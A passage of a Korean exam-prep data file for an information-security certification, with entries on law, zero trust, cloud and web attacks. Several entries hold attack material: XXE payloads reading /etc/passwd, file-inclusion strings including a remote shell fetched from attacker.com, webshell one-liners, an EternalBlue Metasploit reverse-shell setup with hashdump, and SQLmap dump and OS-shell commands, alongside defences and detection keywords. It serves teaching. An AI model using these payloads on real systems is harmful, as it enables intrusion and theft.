    title: '전자서명법',
    content: `
**전자서명의 효력:**
- 전자서명은 법적 효력 인정
- 2020년 공인인증서 제도 폐지 → 공동인증서

**전자서명 요건:**

| 요건 | 설명 |
|------|------|
| 서명자 확인 | 전자서명 생성키 = 서명자 보유 |
| 위조·변경 감지 | 전자문서 변경 여부 확인 가능 |
| 비밀 유지 | 서명생성키 비밀 유지 |

**전자서명 3요소:**

| 요소 | 설명 |
|------|------|
| **인증** | 서명자 신원 확인 |
| **무결성** | 문서 변조 방지 |
| **부인방지** | 서명 사실 부인 불가 |

**공인인증 → 전자서명:**
\`\`\`
2020년 전자서명법 개정
- 공인인증서 제도 폐지
- 다양한 전자서명 인정
- 공동인증서, 금융인증서, 간편인증 등
\`\`\`

**인증서 발급기관:**
- 공동인증서: 한국인터넷진흥원(KISA), 금융결제원
- 금융인증서: 금융결제원
- 민간인증서: 카카오, 네이버, 통신사 등
    `,
    keyPoints: ['인증+무결성+부인방지', '2020년 공인인증 폐지', '공동인증서=구 공인인증서', '다양한 인증서 인정'],
    isWeakness: false,
  },

  {
    id: 'isms-p-detail',
    category: 'law',
    subcategory: '인증',
    title: 'ISMS-P 인증기준 상세',
    content: `
**ISMS-P 인증 구조:**

| 영역 | 항목 수 |
|------|---------|
| 관리체계 수립 및 운영 | 16개 |
| 보호대책 요구사항 | 64개 |
| 개인정보 처리단계별 요구사항 | 22개 |
| **합계** | **102개** |

**관리체계 수립 및 운영 (16개):**
\`\`\`
1.1 관리체계 기반 마련 (4)
1.2 위험 관리 (4)
1.3 관리체계 운영 (3)
1.4 관리체계 점검 및 개선 (5)
\`\`\`

**보호대책 요구사항 (64개):**

| 분류 | 항목 |
|------|------|
| 정책/조직/자산 | 11개 |
| 인적 보안 | 6개 |
| 외부자 보안 | 4개 |
| 물리적 보안 | 7개 |
| 인증 및 권한관리 | 6개 |
| 접근통제 | 7개 |
| 암호화 적용 | 2개 |
| 정보시스템 도입/개발 보안 | 6개 |
| 시스템 및 서비스 운영관리 | 7개 |
| 시스템 및 서비스 보안관리 | 8개 |

**의무대상자:**
- 연간 매출 100억 이상 + 일평균 이용자 100만 이상 ISP
- 집적정보통신시설 사업자
- 연간 매출 1,500억 이상 상급종합병원
    `,
    keyPoints: ['102개 인증기준', '관리체계 16개', '보호대책 64개', '개인정보 22개'],
    isWeakness: true,
  },

  // ==================== 최신 보안 ====================
  {
    id: 'zero-trust',
    category: 'security',
    subcategory: '최신기술',
    title: '제로 트러스트 (Zero Trust)',
    content: `
**제로 트러스트 원칙:**
- "Never Trust, Always Verify"
- 내부/외부 구분 없이 모든 접근 검증

**기존 경계 보안 vs 제로 트러스트:**

| 항목 | 경계 보안 | 제로 트러스트 |
|------|----------|--------------|
| 신뢰 모델 | 내부=신뢰, 외부=불신 | 모두 불신 |
| 접근 통제 | 네트워크 기반 | 사용자/디바이스 기반 |
| 검증 | 최초 1회 | 지속적 검증 |

**제로 트러스트 핵심 요소:**

| 요소 | 설명 |
|------|------|
| **신원 검증** | 모든 사용자/디바이스 인증 |
| **최소 권한** | 필요한 최소 권한만 부여 |
| **마이크로 세그멘테이션** | 세분화된 네트워크 분리 |
| **지속적 모니터링** | 실시간 행위 분석 |
| **암호화** | 모든 통신 암호화 |

**구현 기술:**
- SDP (Software Defined Perimeter)
- IAM (Identity and Access Management)
- MFA (Multi-Factor Authentication)
- SASE (Secure Access Service Edge)
- EDR/XDR

**NIST 제로 트러스트 아키텍처:**
- SP 800-207
- PEP (Policy Enforcement Point)
- PDP (Policy Decision Point)
    `,
    keyPoints: ['Never Trust Always Verify', '지속적 검증', '최소 권한', '마이크로 세그멘테이션'],
    isWeakness: true,
  },

  {
    id: 'sase-security',
    category: 'security',
    subcategory: '최신기술',
    title: 'SASE / SSE',
    content: `
**SASE (Secure Access Service Edge):**
- 네트워크 + 보안 기능을 클라우드에서 통합 제공
- Gartner 2019년 정의

**SASE 구성요소:**

| 구분 | 기능 |
|------|------|
| **네트워크** | SD-WAN, WAN 최적화 |
| **보안** | SWG, CASB, ZTNA, FWaaS |

**SSE (Security Service Edge):**
- SASE의 보안 기능만 분리
- SWG + CASB + ZTNA

**주요 기능:**

| 기능 | 설명 |
|------|------|
| **SD-WAN** | 소프트웨어 정의 WAN |
| **SWG** | 웹 게이트웨이, URL 필터링 |
| **CASB** | 클라우드 접근 보안 브로커 |
| **ZTNA** | 제로트러스트 네트워크 접근 |
| **FWaaS** | 클라우드 방화벽 |

**장점:**
- 일관된 보안 정책
- 어디서나 안전한 접근
- 운영 복잡성 감소
- 확장성

**주요 벤더:**
- Zscaler, Cloudflare, Palo Alto, Cisco
    `,
    keyPoints: ['SASE=네트워크+보안', 'SSE=보안만', 'SD-WAN+SWG+CASB+ZTNA', '클라우드 기반'],
    isWeakness: false,
  },

  {
    id: 'edr-xdr',
    category: 'security',
    subcategory: '최신기술',
    title: 'EDR / XDR / MDR',
    content: `
**EDR (Endpoint Detection and Response):**
- 엔드포인트 위협 탐지 및 대응
- 행위 기반 탐지

**EDR 기능:**

| 기능 | 설명 |
|------|------|
| 실시간 모니터링 | 엔드포인트 활동 수집 |
| 위협 탐지 | 이상 행위 탐지 |
| 조사 분석 | 포렌식 데이터 제공 |
| 대응 조치 | 격리, 차단, 복구 |

**XDR (Extended DR):**
- EDR 확장, 여러 보안 레이어 통합
- 엔드포인트 + 네트워크 + 클라우드 + 이메일

**XDR vs EDR:**

| 항목 | EDR | XDR |
|------|-----|-----|
| 범위 | 엔드포인트 | 전체 인프라 |
| 데이터 소스 | 단일 | 다중 |
| 상관관계 | 제한적 | 통합 분석 |

**MDR (Managed DR):**
- 관리형 탐지 및 대응 서비스
- 24/7 전문가 모니터링

**NDR (Network DR):**
- 네트워크 트래픽 기반 탐지

**SOAR (Security Orchestration, Automation and Response):**
- 보안 자동화 및 오케스트레이션
- 플레이북 기반 자동 대응
    `,
    keyPoints: ['EDR=엔드포인트', 'XDR=통합 탐지', 'MDR=관리형', 'SOAR=자동화'],
    isWeakness: true,
  },

  // ==================== TLS 취약점 ====================
  {
    id: 'tls-vulnerabilities',
    category: 'crypto',
    subcategory: 'TLS',
    title: 'SSL/TLS 취약점',
    content: `
**주요 SSL/TLS 취약점:**

| 취약점 | CVE | 설명 |
|--------|-----|------|
| **Heartbleed** | CVE-2014-0160 | OpenSSL Heartbeat 메모리 유출 |
| **POODLE** | CVE-2014-3566 | SSL 3.0 다운그레이드 공격 |
| **FREAK** | CVE-2015-0204 | RSA Export 키 강제 사용 |
| **Logjam** | CVE-2015-4000 | DH 512bit 강제 사용 |
| **BEAST** | CVE-2011-3389 | CBC 모드 IV 예측 |
| **CRIME** | - | 압축 기반 정보 유출 |
| **BREACH** | - | HTTP 압축 공격 |

**Heartbleed:**
\`\`\`
- OpenSSL 1.0.1 ~ 1.0.1f 영향
- Heartbeat 확장의 경계 검사 미흡
- 서버 메모리 64KB 노출 가능
- 개인키, 세션키, 사용자 데이터 유출
\`\`\`

**POODLE:**
\`\`\`
- SSL 3.0 CBC 모드 패딩 취약점
- TLS 연결을 SSL 3.0으로 다운그레이드
- 대응: SSL 3.0 비활성화
\`\`\`

**안전한 설정:**
\`\`\`apache
# SSL 3.0, TLS 1.0, 1.1 비활성화
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1

# TLS 1.2, 1.3만 허용
SSLProtocol -all +TLSv1.2 +TLSv1.3

# 강력한 암호 스위트
SSLCipherSuite HIGH:!aNULL:!MD5:!3DES
\`\`\`
    `,
    keyPoints: ['Heartbleed=메모리 유출', 'POODLE=SSL 3.0', 'TLS 1.2+ 사용', 'SSL 3.0 비활성화'],
    isWeakness: true,
  },

  // ==================== 웹 취약점 추가 ====================
  {
    id: 'xxe-injection',
    category: 'app',
    subcategory: '웹공격',
    title: 'XXE Injection',
    content: `
**XXE (XML External Entity) Injection:**
- XML 파서가 외부 엔티티를 처리할 때 발생
- 서버 파일 읽기, SSRF, DoS 가능

**공격 형태:**

| 공격 | 설명 |
|------|------|
| 파일 읽기 | 서버 로컬 파일 접근 |
| SSRF | 내부 서비스 요청 |
| DoS | Billion Laughs (엔티티 무한 참조) |

**공격 페이로드:**
\`\`\`xml
<!-- 파일 읽기 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

<!-- SSRF -->
<!ENTITY xxe SYSTEM "http://internal-server/admin">

<!-- Billion Laughs (DoS) -->
<!DOCTYPE bomb [
  <!ENTITY a "dos">
  <!ENTITY b "&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;">
]>
\`\`\`

**대응:**

| 대응 | 설명 |
|------|------|
| 외부 엔티티 비활성화 | XML 파서 설정 |
| DTD 비활성화 | DOCTYPE 처리 금지 |
| 화이트리스트 | 허용된 XML 스키마만 |
| 입력값 검증 | DTD, ENTITY 필터링 |
    `,
    keyPoints: ['외부 엔티티=파일 읽기', 'Billion Laughs=DoS', 'DTD 비활성화', 'ENTITY 필터링'],
    isWeakness: true,
  },

  {
    id: 'http-response-splitting',
    category: 'app',
    subcategory: '웹공격',
    title: 'HTTP Response Splitting',
    content: `
**HTTP 응답 분할 공격:**
- 응답 헤더에 CRLF 삽입
- 응답을 두 개로 분할

**공격 원리:**
\`\`\`
입력값: value%0d%0a%0d%0a<html>악성코드</html>

정상 응답:
HTTP/1.1 200 OK
Set-Cookie: name=value

공격 응답:
HTTP/1.1 200 OK
Set-Cookie: name=value

<html>악성코드</html>
HTTP/1.1 200 OK  ← 두 번째 응답
\`\`\`

**CRLF 인젝션:**
- CR (Carriage Return): %0d, \\r
- LF (Line Feed): %0a, \\n
- 연속 CRLF: 헤더와 바디 구분

**공격 유형:**

| 유형 | 설명 |
|------|------|
| XSS | 악성 스크립트 삽입 |
| 캐시 포이즈닝 | 프록시 캐시 오염 |
| 세션 고정 | Set-Cookie 조작 |

**대응:**

| 대응 | 설명 |
|------|------|
| CRLF 필터링 | %0d, %0a, \\r, \\n 제거 |
| 인코딩 | 출력값 인코딩 |
| 헤더 API 사용 | 직접 문자열 조작 금지 |
    `,
    keyPoints: ['CRLF=%0d%0a', '응답 분할', 'CR+LF 필터링', '헤더 API 사용'],
    isWeakness: true,
  },

  {
    id: 'file-inclusion',
    category: 'app',
    subcategory: '웹공격',
    title: 'File Inclusion 취약점',
    content: `
**파일 포함 취약점:**
- 동적으로 파일을 포함할 때 발생
- 서버 파일 노출, 원격 코드 실행

**LFI (Local File Inclusion):**
\`\`\`
취약 코드:
<?php include($_GET['page'].'.php'); ?>

공격:
?page=../../../etc/passwd%00
?page=....//....//....//etc/passwd
\`\`\`

**RFI (Remote File Inclusion):**
\`\`\`
공격:
?page=http://attacker.com/shell.txt

조건: allow_url_include = On (PHP)
\`\`\`

**공격 기법:**

| 기법 | 설명 |
|------|------|
| Path Traversal | ../ 사용 |
| Null Byte | %00으로 확장자 우회 |
| 이중 인코딩 | %252e%252e%252f |
| Wrapper | php://filter, data:// |

**PHP Wrapper 활용:**
\`\`\`
# 소스코드 읽기
?page=php://filter/convert.base64-encode/resource=config

# 코드 실행
?page=data://text/plain,<?php system($_GET['cmd']); ?>
\`\`\`

**대응:**

| 대응 | 설명 |
|------|------|
| 화이트리스트 | 허용된 파일만 |
| 경로 검증 | ../ 필터링 |
| allow_url_include | Off 설정 |
| 입력값 검증 | 파일명만 허용 |
    `,
    keyPoints: ['LFI=로컬 파일', 'RFI=원격 파일', 'Path Traversal', 'allow_url_include=Off'],
    isWeakness: true,
  },

  // ==================== 모의해킹 ====================
  {
    id: 'pentest-methodology',
    category: 'security',
    subcategory: '모의해킹',
    title: '모의해킹 방법론',
    content: `
**모의해킹 단계:**

| 단계 | 활동 |
|------|------|
| **1. 사전 협의** | 범위, 규칙, 일정 |
| **2. 정보 수집** | 풋프린팅, 스캐닝 |
| **3. 취약점 분석** | 취약점 스캔, 수동 분석 |
| **4. 침투** | 익스플로잇, 권한 획득 |
| **5. 후속 공격** | 권한 상승, 내부 이동 |
| **6. 보고서** | 결과 보고, 대응방안 |

**정보 수집:**
\`\`\`
# WHOIS
whois example.com

# DNS 정보
nslookup -type=any example.com
dig example.com any

# 서브도메인
subfinder -d example.com
\`\`\`

**주요 도구:**

| 단계 | 도구 |
|------|------|
| 정보 수집 | Nmap, Shodan, theHarvester |
| 취약점 스캔 | Nessus, OpenVAS, Nikto |
| 웹 테스트 | Burp Suite, OWASP ZAP |
| 익스플로잇 | Metasploit, SQLMap |
| 패스워드 | John, Hashcat, Hydra |
| 후처리 | Mimikatz, BloodHound |

**PTES (Penetration Testing Execution Standard):**
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting
    `,
    keyPoints: ['정보수집→취약점→침투→후속공격', 'Nmap=스캐닝', 'Metasploit=익스플로잇', 'Burp Suite=웹'],
    isWeakness: true,
  },

  {
    id: 'metasploit-usage',
    category: 'security',
    subcategory: '모의해킹',
    title: 'Metasploit 사용법',
    content: `
**Metasploit 구조:**

| 구성 | 설명 |
|------|------|
| **Exploit** | 취약점 공격 코드 |
| **Payload** | 공격 후 실행 코드 |
| **Auxiliary** | 스캔, 정보 수집 |
| **Encoder** | 페이로드 인코딩 |
| **Post** | 후속 공격 모듈 |

**기본 명령어:**
\`\`\`bash
# 시작
msfconsole

# 검색
search type:exploit platform:windows smb
search cve:2017-0144

# 모듈 사용
use exploit/windows/smb/ms17_010_eternalblue
info
show options

# 설정
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# 실행
exploit
run
\`\`\`

**Meterpreter 명령:**
\`\`\`
sysinfo          # 시스템 정보
getuid           # 현재 사용자
getsystem        # 권한 상승
hashdump         # 해시 덤프
keyscan_start    # 키로거
screenshot       # 스크린샷
shell            # 시스템 셸
\`\`\`

**주요 익스플로잇:**
- ms17_010_eternalblue (WannaCry)
- ms08_067_netapi
- psexec (Pass-the-Hash)
    `,
    keyPoints: ['Exploit+Payload', 'msfconsole', 'Meterpreter=세션', 'hashdump=해시 덤프'],
    isWeakness: true,
  },

  {
    id: 'webshell-analysis',
    category: 'security',
    subcategory: '모의해킹',
    title: '웹쉘 분석',
    content: `
**웹쉘 정의:**
- 웹 서버에 업로드된 악성 스크립트
- 원격 명령 실행, 파일 관리

**웹쉘 종류:**

| 언어 | 예시 |
|------|------|
| PHP | c99, r57, b374k |
| JSP | cmd.jsp |
| ASP | cmd.asp |
| ASPX | aspxspy |

**간단한 웹쉘:**
\`\`\`php
<!-- PHP 원라이너 -->
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

<!-- JSP -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
\`\`\`

**웹쉘 탐지:**

| 방법 | 설명 |
|------|------|
| 시그니처 탐지 | system, exec, eval 등 |
| 파일 무결성 | 해시값 비교 |
| 행위 기반 | 비정상 프로세스 |
| 로그 분석 | 의심 파일 접근 |

**탐지 키워드:**
\`\`\`
PHP: eval, system, exec, shell_exec, passthru,
     proc_open, popen, base64_decode
JSP: Runtime.getRuntime().exec
ASP: WScript.Shell, Execute
\`\`\`

**대응:**
- 파일 업로드 제한 (확장자, 타입)
- 웹 디렉터리 실행 권한 제거
- WAF 룰 적용
- 정기적 무결성 검사
    `,
    keyPoints: ['eval/system=위험 함수', 'base64_decode=난독화', '파일 업로드 제한', '실행 권한 제거'],
    isWeakness: true,
  },

  // ==================== 클라우드 심화 ====================
  {
    id: 'aws-security',
    category: 'security',
    subcategory: '클라우드',
    title: 'AWS 보안',
    content: `
**AWS 보안 서비스:**

| 서비스 | 기능 |
|--------|------|
| **IAM** | 접근 권한 관리 |
| **GuardDuty** | 위협 탐지 |
| **Security Hub** | 보안 현황 통합 |
| **WAF** | 웹 방화벽 |
| **Shield** | DDoS 방어 |
| **KMS** | 키 관리 |
| **CloudTrail** | API 로깅 |
| **Config** | 구성 관리 |

**IAM 모범 사례:**
\`\`\`
1. Root 계정 사용 금지
2. MFA 적용
3. 최소 권한 원칙
4. 역할(Role) 사용
5. 정기적 권한 검토
6. 접근키 주기적 교체
\`\`\`

**S3 보안:**

| 설정 | 설명 |
|------|------|
| 버킷 정책 | 접근 제어 |
| ACL | 객체 권한 |
| 퍼블릭 차단 | 기본 활성화 |
| 암호화 | SSE-S3, SSE-KMS |
| 버전 관리 | 삭제 방지 |

**VPC 보안:**
- Security Group: 인스턴스 방화벽 (상태 저장)
- NACL: 서브넷 방화벽 (상태 비저장)
- VPC Flow Logs: 트래픽 로깅

**공동 책임 모델:**
- AWS: 클라우드의 보안 (인프라)
- 고객: 클라우드 내의 보안 (데이터, 설정)
    `,
    keyPoints: ['IAM=접근 관리', 'GuardDuty=위협 탐지', 'S3 퍼블릭 차단', '공동 책임 모델'],
    isWeakness: true,
  },

  {
    id: 'azure-security',
    category: 'security',
    subcategory: '클라우드',
    title: 'Azure 보안',
    content: `
**Azure 보안 서비스:**

| 서비스 | 기능 |
|--------|------|
| **Azure AD** | ID 관리 |
| **Defender for Cloud** | 보안 통합 |
| **Sentinel** | SIEM |
| **Key Vault** | 키/비밀 관리 |
| **DDoS Protection** | DDoS 방어 |
| **Firewall** | 네트워크 방화벽 |

**Azure AD:**
\`\`\`
- 클라우드 기반 ID 서비스
- SSO (Single Sign-On)
- MFA 지원
- 조건부 접근
- PIM (Privileged Identity Management)
\`\`\`

**네트워크 보안:**

| 구성 | 설명 |
|------|------|
| **NSG** | 네트워크 보안 그룹 |
| **ASG** | 애플리케이션 보안 그룹 |
| **Azure Firewall** | 관리형 방화벽 |
| **Private Link** | 프라이빗 연결 |

**Defender for Cloud:**
- 보안 점수
- 취약점 평가
- 규정 준수 대시보드
- 위협 탐지

**로깅/모니터링:**
- Azure Monitor
- Log Analytics
- Activity Log
- Diagnostic Settings

**암호화:**
- Azure Disk Encryption
- Storage Service Encryption
- TDE (SQL Database)
    `,
    keyPoints: ['Azure AD=ID 관리', 'Sentinel=SIEM', 'NSG=보안 그룹', 'Defender=보안 통합'],
    isWeakness: false,
  },

  // ==================== 데이터베이스 보안 ====================
  {
    id: 'database-security-detail',
    category: 'app',
    subcategory: '데이터베이스',
    title: '데이터베이스 보안 상세',
    content: `
**DB 보안 위협:**

| 위협 | 설명 |
|------|------|
| **집성** | 낮은 등급 정보 조합 → 높은 등급 유추 |
| **추론** | 통계 정보로 기밀 정보 유추 |
| **SQL Injection** | 악의적 SQL 실행 |

**접근 통제:**
\`\`\`sql
-- 권한 부여
GRANT SELECT, INSERT ON employees TO user1;

-- 권한 회수
REVOKE INSERT ON employees FROM user1;

-- 뷰 기반 접근 통제
CREATE VIEW emp_public AS
  SELECT id, name, dept FROM employees;
GRANT SELECT ON emp_public TO public_user;
\`\`\`

**DB 암호화 방식:**

| 방식 | 위치 | 특징 |
|------|------|------|
| **API** | 애플리케이션 | 서버 부하 분산 |
| **Plug-in** | DB 서버 | DB 성능 영향 |
| **Hybrid** | 혼합 | 균형 |
| **TDE** | DB 엔진 | 투명한 암호화 |

**TDE (Transparent Data Encryption):**
- 데이터 파일 자체 암호화
- 애플리케이션 수정 불필요
- Oracle, SQL Server, MySQL 지원

**DB 감사:**
\`\`\`sql
-- Oracle 감사
AUDIT SELECT ON employees BY ACCESS;

-- SQL Server 감사
CREATE SERVER AUDIT MyAudit TO FILE (FILEPATH = 'C:\\audit');
\`\`\`

**트랜잭션 ACID:**

| 특성 | 설명 |
|------|------|
| Atomicity | 원자성 (전부 또는 전무) |
| Consistency | 일관성 |
| Isolation | 격리성 |
| Durability | 영속성 |
    `,
    keyPoints: ['GRANT/REVOKE', 'TDE=투명 암호화', '뷰 기반 접근통제', 'ACID'],
    isWeakness: true,
  },

  // ==================== 블루투스/무선 공격 ====================
  {
    id: 'bluetooth-attack',
    category: 'network',
    subcategory: '무선',
    title: '블루투스 공격',
    content: `
**블루투스 공격 유형:**

| 공격 | 설명 |
|------|------|
| **Blueprinting** | 블루투스 장치 검색/정보 수집 |
| **Bluesnarfing** | 장치 파일/정보 무단 접근 |
| **Bluebugging** | 장치 원격 제어 |
| **Bluejacking** | 스팸 메시지 전송 |
| **KNOB** | 암호화 키 협상 조작 |

**Bluesnarfing:**
\`\`\`
- OBject EXchange(OBEX) 프로토콜 취약점
- 연락처, 일정, 문자 메시지 탈취
- 10-15m 범위 내 공격 가능
\`\`\`

**Bluebugging:**
\`\`\`
- AT 명령어 취약점 악용
- 전화 걸기, 문자 발송
- 통화 도청
\`\`\`

**대응:**

| 대응 | 설명 |
|------|------|
| 비검색 모드 | 불필요 시 숨김 |
| 페어링 관리 | 알 수 없는 기기 거부 |
| 블루투스 비활성화 | 미사용 시 끄기 |
| 최신 펌웨어 | 보안 패치 적용 |

**BYOD 보안:**
- MDM (Mobile Device Management)
- MAM (Mobile Application Management)
- 컨테이너화
- 원격 삭제 (Remote Wipe)
    `,
    keyPoints: ['Bluesnarfing=정보 탈취', 'Bluebugging=원격 제어', '비검색 모드', 'MDM=모바일 관리'],
    isWeakness: true,
  },

  // ==================== 기출 핵심 개념 ====================
  {
    id: 'key-concepts-1',
    category: 'system',
    subcategory: '기출핵심',
    title: '기출 핵심 개념 1',
    content: `
**자주 출제되는 개념:**

| 개념 | 설명 |
|------|------|
| **살라미 공격** | 눈치 못챌 정도의 소액 빼가기 |
| **데이터 디들링** | 원천 데이터 변조/위조 |
| **이블 트윈** | 동일 SSID 가짜 AP |
| **사이버스쿼팅** | 유명 도메인 선점 후 부당 이익 |

**공격 기법:**

| 공격 | 설명 |
|------|------|
| **Bonk** | 시퀀스 번호를 모두 1로 조작 |
| **Boink** | 시퀀스 번호를 불규칙하게 변경 |
| **Land Attack** | 출발지=목적지 IP |
| **Teardrop** | IP 단편화 오프셋 조작 |

**DDoS 공격 도구:**
- Trinoo
- TFN (Tribe Flood Network)
- TFN2K
- Stacheldraht

**HTTP 공격:**

| 공격 | 특징 |
|------|------|
| **Slowloris** | 헤더 끝 CRLF 미전송 |
| **RUDY** | POST Body 천천히 전송 |
| **Slow Read** | Window Size 작게 설정 |
| **Hulk DoS** | 무작위 URL GET 요청 |
| **CC Attack** | Cache-Control: no-cache |
    `,
    keyPoints: ['살라미=소액 탈취', 'Land Attack=출발지=목적지', 'Slowloris=헤더 미완성', 'RUDY=느린 POST'],
    isWeakness: true,
  },

  {
    id: 'key-concepts-2',
    category: 'system',
    subcategory: '기출핵심',
    title: '기출 핵심 개념 2',
    content: `
**스캐닝 정리:**

| 구분 | 스캔 종류 |
|------|----------|
| **TCP Open** | Connect, SYN |
| **TCP Stealth** | FIN, NULL, XMAS |
| **특수** | UDP, ACK (방화벽 확인) |

**스캔 응답:**
\`\`\`
TCP SYN 스캔:
- 열림: SYN+ACK → RST 전송
- 닫힘: RST+ACK

스텔스 스캔 (FIN/NULL/XMAS):
- 열림: 응답 없음
- 닫힘: RST
\`\`\`

**네트워크 정보 수집:**

| 단계 | 설명 |
|------|------|
| **풋프린팅** | 공개 정보 수집 (WHOIS 등) |
| **스캐닝** | 포트/서비스 확인 |
| **목록화** | 상세 정보 정리 |

**라우팅 필터링:**
\`\`\`
Ingress Filtering: 외부 → 내부 (내부 IP 차단)
Egress Filtering: 내부 → 외부 (외부 IP 차단)
Null Routing: Black Hole 라우팅
uRPF: 출발지 IP 역검증
\`\`\`

**무선랜 보안:**

| 표준 | 암호화 |
|------|--------|
| WEP | RC4 (취약) |
| WPA | TKIP |
| WPA2 | AES-CCMP |
| WPA3 | SAE |
    `,
    keyPoints: ['SYN 스캔=열림 시 SYN+ACK', 'Stealth=열림 시 무응답', 'Ingress=외부→내부', 'WPA2=AES'],
    isWeakness: true,
  },

  {
    id: 'key-concepts-3',
    category: 'law',
    subcategory: '기출핵심',
    title: '기출 핵심 개념 3 (법규)',
    content: `
**개인정보 보호법:**

| 용어 | 정의 |
|------|------|
| **개인정보** | 살아있는 개인 식별 정보 |
| **고유식별정보** | 주민번호, 여권번호, 면허번호, 외국인번호 |
| **민감정보** | 건강, 사상, 신념, 유전자, 범죄경력 |
| **가명정보** | 추가 정보 없이 특정 개인 식별 불가 |
| **익명정보** | 더 이상 개인 식별 불가 |

**개인정보 처리 원칙:**
\`\`\`
1. 목적 명확화
2. 목적 내 처리
3. 정확성/완전성/최신성
4. 안전성 확보
5. 열람청구권 보장
6. 사생활 침해 최소화
7. 익명처리 가능하면 익명으로
8. 처리자 책임
\`\`\`

**기술적/관리적 보호조치:**

| 구분 | 내용 |
|------|------|
| **관리적** | 내부관리계획, 보안교육 |
| **기술적** | 접근통제, 암호화, 접속기록 |
| **물리적** | 출입통제, 잠금장치 |

**주요 기간:**
- 접속기록 보관: 1년 (5만명 이상: 2년)
- 권한 기록 보관: 3년
- 개인정보 유출 통지: 72시간 이내
- 개인정보 파기: 5일 이내 (보유기간 경과)
    `,
    keyPoints: ['고유식별정보=주민번호 등', '접속기록 1년/2년', '유출 통지 72시간', '파기 5일 이내'],
    isWeakness: true,
  },

  {
    id: 'key-concepts-4',
    category: 'crypto',
    subcategory: '기출핵심',
    title: '기출 핵심 개념 4 (암호학)',
    content: `
**암호 알고리즘 분류:**

| 분류 | 알고리즘 |
|------|----------|
| **대칭키 스트림** | RC4, A5/1, ChaCha20 |
| **대칭키 블록** | DES, 3DES, AES, SEED, ARIA |
| **공개키 소인수분해** | RSA, Rabin |
| **공개키 이산로그** | ElGamal, DSA, DH |
| **공개키 타원곡선** | ECC, ECDSA, ECDH |
| **해시** | MD5, SHA-1, SHA-2, SHA-3 |

**키 길이 비교:**

| 알고리즘 | 키 길이 | 상태 |
|----------|---------|------|
| DES | 56bit | 취약 |
| 3DES | 168bit | 레거시 |
| AES | 128/192/256bit | 권장 |
| RSA | 2048bit+ | 권장 |
| ECC | 256bit | 권장 |

**디지털 서명:**
\`\`\`
서명: 개인키로 해시값 암호화
검증: 공개키로 복호화 후 해시 비교

제공: 인증, 무결성, 부인방지
미제공: 기밀성
\`\`\`

**키 교환:**

| 방식 | 설명 |
|------|------|
| **DH** | 이산로그, 중간자 공격 취약 |
| **RSA** | 공개키로 대칭키 암호화 |
| **ECDH** | 타원곡선 DH |

**MAC vs 전자서명:**

| 구분 | MAC | 전자서명 |
|------|-----|----------|
| 키 | 대칭키 | 비대칭키 |
| 부인방지 | X | O |
    `,
    keyPoints: ['AES=현재 표준', 'RSA 2048bit+', '서명=개인키로', 'MAC=부인방지 X'],
    isWeakness: true,
  },

  // ==================== 보안 도구 상세 ====================
  {
    id: 'security-tools-web',
    category: 'security',
    subcategory: '보안도구',
    title: '웹 취약점 스캐너',
    content: `
**웹 취약점 스캐너 종류:**

| 도구 | 유형 | 특징 | 주요 기능 |
|------|------|------|----------|
| **Nikto** | CLI | Perl 기반, 빠른 스캔 | 웹 서버 설정 오류, 기본 파일 탐지 |
| **OWASP ZAP** | GUI | 오픈소스, 프록시 | 동적 분석, 스파이더, 퍼저 |
| **Burp Suite** | GUI | 상용/무료, 프록시 | 수동+자동, 인터셉터, 리피터 |
| **SQLmap** | CLI | SQL 인젝션 전문 | DB 덤프, 쉘 획득, WAF 우회 |
| **Acunetix** | GUI | 상용 | 자동 스캔, 보고서 생성 |
| **Netsparker** | GUI | 상용 | 정확한 탐지, 증거 제공 |

**OWASP ZAP 동작 흐름:**
\`\`\`
┌─────────────┐    ┌──────────────┐    ┌─────────────┐
│   브라우저   │───▶│   ZAP 프록시  │───▶│   웹 서버   │
│             │◀───│   (분석/수정) │◀───│             │
└─────────────┘    └──────────────┘    └─────────────┘
                          │
                   ┌──────┴──────┐
                   │   기능      │
                   ├─────────────┤
                   │ • 스파이더   │ ← 자동 크롤링
                   │ • 액티브 스캔│ ← 취약점 탐지
                   │ • 퍼저      │ ← 입력값 테스트
                   │ • 알림      │ ← 취약점 보고
                   └─────────────┘
\`\`\`

**Burp Suite 구성요소:**

| 구성요소 | 기능 |
|----------|------|
| **Proxy** | HTTP/S 트래픽 가로채기 |
| **Scanner** | 자동 취약점 스캔 (Pro) |
| **Intruder** | 자동화된 공격 (브루트포스) |
| **Repeater** | 수동 요청 수정/재전송 |
| **Sequencer** | 세션 토큰 난수성 분석 |
| **Decoder** | 인코딩/디코딩 |
| **Comparer** | 응답 비교 |

**SQLmap 주요 옵션:**
\`\`\`bash
# 기본 스캔
sqlmap -u "http://target.com/page?id=1"

# POST 데이터
sqlmap -u "http://target.com/login" --data="user=test&pass=test"

# DB 덤프
sqlmap -u "..." --dbs              # DB 목록
sqlmap -u "..." -D dbname --tables  # 테이블 목록
sqlmap -u "..." -D dbname -T users --dump  # 데이터 덤프

# 고급 옵션
sqlmap -u "..." --level=5 --risk=3  # 깊은 스캔
sqlmap -u "..." --os-shell          # OS 쉘 획득
sqlmap -u "..." --tamper=space2comment  # WAF 우회
\`\`\`
    `,
    keyPoints: ['Burp Suite=프록시+인터셉터', 'ZAP=오픈소스', 'SQLmap=SQL 인젝션 자동화', 'Nikto=빠른 서버 스캔'],
    isWeakness: true,
  },

  {
    id: 'security-tools-network',
    category: 'security',
    subcategory: '보안도구',
    title: '네트워크 스캐너',
    content: `
**네트워크 스캐너 종류:**

| 도구 | 유형 | 특징 | 주요 용도 |
|------|------|------|----------|
| **Nmap** | CLI/GUI | 오픈소스, 표준 | 포트/서비스/OS 스캔 |
| **Nessus** | GUI | 상용, 가장 널리 사용 | 종합 취약점 스캔 |
| **OpenVAS** | GUI | Nessus 오픈소스 포크 | 무료 취약점 스캔 |
| **Qualys** | Cloud | SaaS 기반 | 클라우드 취약점 관리 |
| **Masscan** | CLI | 초고속 스캔 | 대규모 네트워크 스캔 |

**Nmap 스캔 흐름:**
